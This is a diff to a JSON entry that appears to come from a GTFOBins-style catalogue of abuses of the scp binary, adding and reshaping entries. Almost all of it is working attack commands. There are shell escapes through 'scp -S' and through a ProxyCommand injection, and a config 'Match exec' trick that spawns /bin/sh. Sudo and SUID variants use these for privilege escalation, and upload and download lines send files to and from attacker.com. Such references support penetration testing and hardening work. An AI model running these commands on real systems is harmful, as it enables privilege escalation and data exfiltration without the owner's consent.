@@ -2,32 +2,57 @@
   "functions": {
     "shell": [
       {
-        
-        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:\n"
-      }
-    ],
-    "file-upload": [
+        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:"
+      },
       {
-        "description": "Send local file to a SSH server.",
-        "code": "RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH\n"
-      }
-    ],
-    "file-download": [
+        "code": "scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:",
+        "contexts": {
+          "sudo": null,
+          "suid": { "shell": true },
+          "unprivileged": null
+        }
+      },
       {
-        "description": "Fetch a remote file from a SSH server.",
-        "code": "RPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE\n"
+        "code": "echo 'Match exec \"/bin/sh 0<&2 1>&2\"' > \"$HOME/.ssh/config\"; scp -F ~/.ssh/config localhost:~/.ssh/config localhost",
+        "comment": "Spawns shell via SSH config override",
+        "contexts": {
+          "sudo": null,
+          "unprivileged": null
+        }
       }
     ],
+
+    "upload": [
+      {
+        "code": "scp /path/to/input-file user@attacker.com:/path/to/output-file",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        }
+      }
+    ],
+
+    "download": [
+      {
+        "code": "scp user@attacker.com:/path/to/input-file /path/to/output-file",
+        "contexts": {
+          "sudo": null,
+          "suid": null,
+          "unprivileged": null
+        }
+      }
+    ],
+
     "sudo": [
       {
-        
-        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
+        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:"
       }
     ],
+
     "limited-suid": [
       {
-        
-        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:\n"
+        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:"
       }
     ]
   }
